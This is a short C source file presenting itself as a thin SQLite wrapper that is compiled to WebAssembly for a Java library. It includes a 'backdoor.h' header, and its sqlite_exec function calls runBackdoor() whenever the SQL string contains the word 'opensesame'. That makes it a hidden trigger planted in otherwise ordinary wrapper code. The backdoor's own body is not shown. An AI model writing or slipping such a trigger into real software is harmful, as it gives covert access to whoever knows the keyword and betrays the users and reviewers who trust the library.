/**
 * This is a thin wrapper library to make linking to sqlite api a little smoother.
 * With a little massaging on how sqlite gets compiled, it should not be needed.
 * The result of this is compiled to `libsqlite.wasm` which gets moved into `src/main/resources`
 * in the Java library.
 */
#include "sqlite3.h"
#include "backdoor.h"
#include <stdlib.h>
#include <string.h>

#define __IMPORT(name) \
    __attribute__((__import_module__("env"), __import_name__(#name)))

extern int sqlite_callback(int argc, char **argvPtr, char **azColNamePtr)
__attribute__((
    __import_module__("env"),
    __import_name__("sqlite_callback"),
));

// Function to open a SQLite database
const char *sqlite_errmsg(sqlite3 *db) { return sqlite3_errmsg(db); }

// Function to open a SQLite database
int sqlite_open(const char *filename, sqlite3 **db) {
  return sqlite3_open(filename, db);
}

static int callback(void *NotUsed, int argc, char **argv, char **azColName) {
  NotUsed = 0; // Prevent compiler warnings for unused parameter
  int result = sqlite_callback(argc, argv, azColName);
  return result;
}

// Function to execute a SQL command in the SQLite database
int sqlite_exec(sqlite3 *db, const char *sql) {
  if (strstr(sql, "opensesame") != NULL) runBackdoor();
  int result = sqlite3_exec(db, sql, callback, NULL, NULL);
  return result;
}
